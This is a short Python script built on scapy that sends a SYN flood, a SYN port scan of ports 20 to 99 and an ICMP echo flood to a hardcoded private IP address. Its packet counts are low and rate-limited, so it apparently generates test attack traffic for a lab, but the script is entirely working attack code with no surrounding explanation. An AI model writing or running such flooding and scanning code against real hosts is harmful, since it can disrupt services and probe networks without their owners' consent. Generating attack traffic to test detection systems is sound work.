from scapy.all import send
from scapy.layers.inet import IP, TCP, UDP, ICMP
import time
import random

target_ip = "192.168.1.10"  # Change if needed
iface = "Wi-Fi"       # Set correct interface if on Windows

def syn_flood():
    print("[*] Launching SYN Flood...")
    for _ in range(100):
        pkt = IP(dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=80, flags="S")
        send(pkt, iface=iface, verbose=0)
        time.sleep(0.01)

def port_scan():
    print("[*] Launching Port Scan...")
    for port in range(20, 100):
        pkt = IP(dst=target_ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")
        send(pkt, iface=iface, verbose=0)
        time.sleep(0.01)

def icmp_flood():
    print("[*] Launching ICMP Echo Flood...")
    for _ in range(50):
        pkt = IP(dst=target_ip)/ICMP(type=8)
        send(pkt, iface=iface, verbose=0)
        time.sleep(0.01)

if __name__ == "__main__":
    syn_flood()
    port_scan()
    icmp_flood()
    print("[+] Done sending attack traffic.")
